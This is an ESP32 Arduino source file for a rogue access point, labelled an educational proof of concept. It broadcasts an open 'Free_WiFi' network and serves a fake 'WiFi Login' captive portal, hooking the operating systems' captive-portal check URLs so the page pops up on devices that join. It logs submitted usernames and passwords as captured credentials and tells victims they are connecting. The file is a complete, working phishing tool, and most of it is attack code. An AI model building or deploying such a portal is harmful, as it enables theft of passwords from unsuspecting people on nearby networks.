/*
 * ESP32 Rogue AP - Captive Portal + Credential Harvesting
 * Educational Proof of Concept
 * 
 * PINOUT: OLED SDA->21, SCL->22, BTN_UP->14, BTN_DOWN->27, BTN_SEL->26
 * Libraries: Adafruit_SSD1306, Adafruit_GFX, WebServer (built-in)
 */

#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include "config.h"
#include "display_manager.h"
#include "input_manager.h"
#include "skull_logo.h"

WebServer server(80);

// ===== CONFIGURATION =====
char ROGUE_SSID[33] = "Free_WiFi";

// ===== State =====
static bool apOn = false;
static int cursor = 0;
static int menuState = 0; // 0=splash, 1=main, 2=edit, 3=status
static unsigned long lastRender = 0;
static unsigned long splashStart = 0;
static int credCount = 0;

// Edit mode
static int editPos = 0;
static char editBuf[33];
static const char editChars[] = "abcdefghijklmnopqrstuvwxyz0123456789_- ";

const char portalHTML[] PROGMEM =
"<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
"<style>"
"body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}"
".box{background:#111;padding:20px;border:1px solid #0f0;border-radius:8px;width:300px}"
"h2{text-align:center;color:#0f0}"
"input{width:100%;padding:10px;margin:8px 0;background:#000;border:1px solid #0f0;color:#0f0;box-sizing:border-box}"
"button{width:100%;padding:10px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer}"
"</style></head><body><div class=\"box\"><h2>WiFi Login</h2>"
"<form action=\"/submit\" method=\"POST\">"
"<input type=\"text\" name=\"username\" placeholder=\"WiFi Name\" required>"
"<input type=\"password\" name=\"password\" placeholder=\"Password\" required>"
"<button type=\"submit\">Connect</button></form></div></body></html>";

void handleRoot() { server.send(200, "text/html", portalHTML); }
void handleSubmit() {
    String user = server.arg("username");
    String pass = server.arg("password");
    Serial.println("[PORTAL] CAPTURED: " + user + ":" + pass);
    credCount++;
    server.send(200, "text/html", "<html><body style='background:#000;color:#0f0;text-align:center;padding-top:50px'><h2>Connecting...</h2></body></html>");
}
void handleNotFound() {
    server.sendHeader("Location", "http://192.168.4.1/", true);
    server.send(302, "text/plain", "");
}

void renderMain();
void renderEdit();
void renderStatus();

void setup() {
    Serial.begin(115200);
    delay(500);
    displayInit();
    inputInit();
    
    server.on("/", handleRoot);
    server.on("/submit", HTTP_POST, handleSubmit);
    server.on("/generate_204", handleRoot);
    server.on("/hotspot-detect.html", handleRoot);
    server.on("/connecttest.txt", handleRoot);
    server.onNotFound(handleNotFound);
    
    splashStart = millis();
    Serial.println("[+] Rogue AP Ready");
}

void loop() {
    unsigned long now = millis();
    ButtonEvent evt = inputGetEvent();
    
    // Splash
    if (menuState == 0 && now - splashStart < 2000) {
        if (evt == EVT_SELECT) splashStart = 0;
        if (now - lastRender > 50) {
            lastRender = now;
            displayClearBuffer();
            displayDrawXBMP(32, 0, SKULL_WIDTH, SKULL_HEIGHT, skull_bits);
            drawCenteredStr(56, "ESP32 ROGUE AP");
            drawCenteredStr(64, "PORTAL STATION");
            displaySendBuffer();
        }
        return;
    }
    if (menuState == 0) menuState = 1;
    
    // Input
    if (menuState == 1) {
        if (evt == EVT_UP && cursor > 0) cursor--;
        if (evt == EVT_DOWN && cursor < 2) cursor++;
        if (evt == EVT_SELECT) {
            if (cursor == 0) {
                if (apOn) {
                    WiFi.softAPdisconnect(true);
                    apOn = false;
                } else {
                    WiFi.mode(WIFI_AP);
                    WiFi.softAP(ROGUE_SSID, "");
                    server.begin();
                    apOn = true;
                }
            }
            if (cursor == 1) {
                strlcpy(editBuf, ROGUE_SSID, sizeof(editBuf));
                editPos = 0;
                menuState = 2;
            }
            if (cursor == 2) menuState = 3;
        }
    } else if (menuState == 2) {
        if (evt == EVT_UP) {
            char c = editBuf[editPos];
            const char* p = strchr(editChars, c);
            int idx = p ? (p - editChars + 1) % strlen(editChars) : 0;
            editBuf[editPos] = editChars[idx];
        }
        if (evt == EVT_DOWN) {
            char c = editBuf[editPos];
            const char* p = strchr(editChars, c);
            int idx = p ? (p - editChars - 1 + strlen(editChars)) % strlen(editChars) : strlen(editChars)-1;
            editBuf[editPos] = editChars[idx];
        }
        if (evt == EVT_SELECT) {
            if (editPos < 15 && editBuf[editPos] != '\0') editPos++;
            else { strlcpy(ROGUE_SSID, editBuf, sizeof(ROGUE_SSID)); menuState = 1; }
        }
    } else if (menuState == 3) {
        if (evt == EVT_SELECT || evt == EVT_UP || evt == EVT_DOWN) menuState = 1;
    }
    
    if (apOn) server.handleClient();
    
    if (now - lastRender > 50) {
        lastRender = now;
        if (menuState == 1) renderMain();
        else if (menuState == 2) renderEdit();
        else if (menuState == 3) renderStatus();
    }
    delay(5);
}

void renderMain() {
    displayClearBuffer();
    displayDrawStr(0, 8, "ROGUE AP STATION");
    displayDrawLine(0, 10, 127, 10);
    
    // FIX: only draw cursor on selected item
    if (cursor == 0) displayDrawStr(0, 22, ">"); else displayDrawStr(0, 22, " ");
    displayDrawStr(8, 22, "Rogue AP");
    displayDrawStr(90, 22, apOn ? "[ON]" : "[OFF]");
    
    if (cursor == 1) displayDrawStr(0, 34, ">"); else displayDrawStr(0, 34, " ");
    displayDrawStr(8, 34, "Edit SSID");
    
    if (cursor == 2) displayDrawStr(0, 46, ">"); else displayDrawStr(0, 46, " ");
    displayDrawStr(8, 46, "Status >");
    
    displayDrawStr(0, 58, "SSID:"); displayDrawStr(40, 58, ROGUE_SSID);
    displaySendBuffer();
}

void renderEdit() {
    displayClearBuffer();
    displayDrawStr(0, 8, "EDIT SSID");
    displayDrawLine(0, 10, 127, 10);
    displayDrawStr(0, 30, editBuf);
    int x = editPos * MENU_FONT_W;
    displayDrawLine(x, 32, x + 6, 32);
    displayDrawStr(0, 50, "UP/DOWN: Char");
    displayDrawStr(0, 60, "SEL: Next/Save");
    displaySendBuffer();
}

void renderStatus() {
    displayClearBuffer();
    displayDrawStr(0, 8, "STATUS");
    displayDrawLine(0, 10, 127, 10);
    char buf[32];
    displayDrawStr(0, 22, "AP IP:"); displayDrawStr(48, 22, apOn ? "192.168.4.1" : "--");
    displayDrawStr(0, 34, "SSID:"); displayDrawStr(40, 34, ROGUE_SSID);
    sprintf(buf, "Creds:%d", credCount); displayDrawStr(0, 46, buf);
    sprintf(buf, "RAM:%dKB", ESP.getFreeHeap()/1024); displayDrawStr(0, 58, buf);
    displaySendBuffer();
}
